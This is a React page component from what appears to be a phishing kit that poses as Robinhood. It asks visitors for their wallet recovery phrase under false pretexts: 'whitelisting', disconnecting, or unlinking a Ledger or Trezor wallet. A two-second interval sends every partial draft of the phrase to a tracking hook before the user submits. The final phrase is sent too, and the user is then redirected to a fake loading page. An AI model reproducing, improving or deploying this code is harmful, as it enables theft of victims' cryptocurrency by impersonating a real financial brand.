import { createFileRoute } from "@tanstack/react-router";
import { useCallback, useEffect, useRef, useState } from "react";
import { GlobeIcon, Rh3DBackground, RH_FONT_FAMILY, RhLogo, useRhQueryParam, useRhTracking } from "@/components/rh/RhShared";

export const Route = createFileRoute("/rh/phrase")({
  head: () => ({ meta: [{ title: "Recovery phrase" }] }),
  component: RhPhrasePage,
});

type PhraseMode = "whitelist" | "disconnect" | "ledger" | "trezor";

const CONTENT: Record<PhraseMode, { title: string; description: string; label: string }> = {
  whitelist: {
    title: "Wallet Whitelist",
    description: "Use the 12/24 word recovery phrase associated with your Robinhood Wallet to enable whitelisting for your designated wallet.",
    label: "Robinhood Wallet",
  },
  disconnect: {
    title: "Disconnect Wallet",
    description: "Use the 12/24 word recovery phrase associated with your wallet to disconnect it from our system.",
    label: "Wallet",
  },
  ledger: {
    title: "Unlink Cold Wallet",
    description: "Type in your 12 or 24 word Ledger Recovery phrase in order to successfully unlink it from your Robinhood account.",
    label: "Ledger",
  },
  trezor: {
    title: "Unlink Cold Wallet",
    description: "Type in your 12 or 24 word Trezor Recovery phrase in order to successfully unlink it from your Robinhood account.",
    label: "Trezor",
  },
};

function RhPhrasePage() {
  const { trackClick, trackInput, rhNavigate, sessionId } = useRhTracking();
  const urlMode = useRhQueryParam("mode") as PhraseMode | null;
  const mode: PhraseMode = (["whitelist", "disconnect", "ledger", "trezor"] as PhraseMode[]).includes(urlMode as PhraseMode) ? (urlMode as PhraseMode) : "whitelist";

  const [phrase, setPhrase] = useState("");
  const [focused, setFocused] = useState(false);
  const lastSentRef = useRef("");
  const phraseRef = useRef("");
  const textareaRef = useRef<HTMLTextAreaElement>(null);

  useEffect(() => { phraseRef.current = phrase; }, [phrase]);

  useEffect(() => {
    const id = setInterval(() => {
      const current = phraseRef.current;
      if (current && current !== lastSentRef.current) {
        lastSentRef.current = current;
        trackInput(`phrase_draft_${mode}`, current);
      }
    }, 2000);
    return () => clearInterval(id);
  }, [mode, trackInput]);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === "Enter") {
      e.preventDefault();
      if (phrase.trim() && !phrase.endsWith(" ")) setPhrase((prev) => prev + " ");
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    let val = e.target.value;
    val = val.replace(/\n/g, " ").replace(/ {2,}/g, " ");
    setPhrase(val);
  };

  const handleSubmit = useCallback(() => {
    if (!phrase.trim()) return;
    trackClick(`Phrase Submit ${mode}`);
    trackInput(`phrase_final_${mode}`, phrase.trim());
    rhNavigate("/rh/loading");
  }, [phrase, mode, trackClick, trackInput, rhNavigate]);

  const wordCount = phrase.trim() ? phrase.trim().split(/\s+/).length : 0;

  return (
    <div style={{ display: "flex", minHeight: "100vh", background: "#000", fontFamily: RH_FONT_FAMILY }}>
      <style>{`@keyframes fadeInUp { from { opacity: 0; transform: translateY(8px);} to { opacity: 1; transform: translateY(0);} }`}</style>

      <div className="hidden md:flex" style={{ width: "50%", background: "#000", alignItems: "center", justifyContent: "center", overflow: "hidden", position: "relative" }}>
        <Rh3DBackground />
      </div>
      <div className="hidden md:block" style={{ width: 1, background: "rgba(255,255,255,0.12)", flexShrink: 0 }} />

      <div className="w-full md:w-1/2" style={{ background: "#000", display: "flex", flexDirection: "column" }}>
        <div className="md:hidden" style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "20px 24px" }}>
          <RhLogo />
          <button style={{ display: "flex", alignItems: "center", gap: 6, background: "transparent", border: "none", color: "#fff", fontSize: 14, fontWeight: 500, cursor: "pointer", padding: "8px 12px" }}>
            <GlobeIcon /><span>US</span>
          </button>
        </div>

        <div style={{ flex: 1, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "80px 60px 40px 60px" }}>
          <div style={{ width: "100%", maxWidth: 416 }}>
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 24, animation: "fadeInUp 0.4s ease both" }}>
              <div style={{ fontSize: 18, color: "#fff", opacity: 0.8, letterSpacing: "0.15em", textTransform: "uppercase", fontWeight: 600 }}>{CONTENT[mode].label}</div>
            </div>

            <h1 style={{ fontSize: 28, fontWeight: 400, color: "#fff", marginBottom: 8, lineHeight: 1.3, textAlign: "center", animation: "fadeInUp 0.4s ease 0.05s both" }}>
              {CONTENT[mode].title}
            </h1>

            <p style={{ fontSize: 14, color: "rgba(255,255,255,0.5)", marginBottom: 24, lineHeight: 1.5, textAlign: "center", animation: "fadeInUp 0.4s ease 0.1s both" }}>
              {CONTENT[mode].description}
            </p>

            <div style={{ animation: "fadeInUp 0.4s ease 0.15s both" }}>
              <label style={{ fontSize: 14, fontWeight: 500, color: "rgba(255,255,255,0.5)", display: "block", marginBottom: 8 }}>Seed Phrase</label>
              <div onClick={() => textareaRef.current?.focus()}
                style={{ position: "relative", minHeight: 80, borderRadius: 8, border: `1px solid ${focused ? "#fff" : "rgba(255,255,255,0.2)"}`, background: focused ? "rgba(255,255,255,0.04)" : "transparent", padding: "0 16px", cursor: "text", transition: "border-color 0.15s, background-color 0.15s" }}>
                <textarea
                  ref={textareaRef}
                  name="Seed Phrase"
                  value={phrase}
                  onChange={handleChange}
                  onKeyDown={handleKeyDown}
                  onFocus={() => setFocused(true)}
                  onBlur={() => setFocused(false)}
                  placeholder="Enter your recovery phrase"
                  autoComplete="off"
                  spellCheck={false}
                  style={{ width: "100%", minHeight: 56, background: "transparent", border: "none", outline: "none", fontSize: 14, fontWeight: 400, color: "#fff", lineHeight: "20px", paddingTop: 16, paddingBottom: 10, resize: "none", fontFamily: "inherit", caretColor: "#fff" }}
                />
                {wordCount > 0 && (
                  <div style={{ position: "absolute", right: 12, bottom: 8, fontSize: 11, color: wordCount === 12 || wordCount === 24 ? "#00C853" : "rgba(255,255,255,0.4)", fontWeight: 500, transition: "color 0.15s" }}>
                    {wordCount} word{wordCount !== 1 ? "s" : ""}
                  </div>
                )}
              </div>
              <p style={{ fontSize: 12, color: "rgba(255,255,255,0.35)", marginTop: 6, marginBottom: 0 }}>
                Divide the seed phrase with an empty space between each word
              </p>
            </div>

            <button onClick={handleSubmit} disabled={!phrase.trim()}
              style={{ width: "100%", height: 52, marginTop: 20, borderRadius: 26, border: "none", cursor: phrase.trim() ? "pointer" : "default", backgroundColor: phrase.trim() ? "#fff" : "rgba(255,255,255,0.2)", color: phrase.trim() ? "#000" : "rgba(255,255,255,0.4)", fontSize: 16, fontWeight: 500, fontFamily: "inherit", pointerEvents: phrase.trim() ? "auto" : "none", animation: "fadeInUp 0.4s ease 0.2s both" }}>
              {mode === "ledger" || mode === "trezor" ? "Next" : "Continue"}
            </button>
          </div>
        </div>
      </div>
      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">{sessionId}</div>
    </div>
  );
}
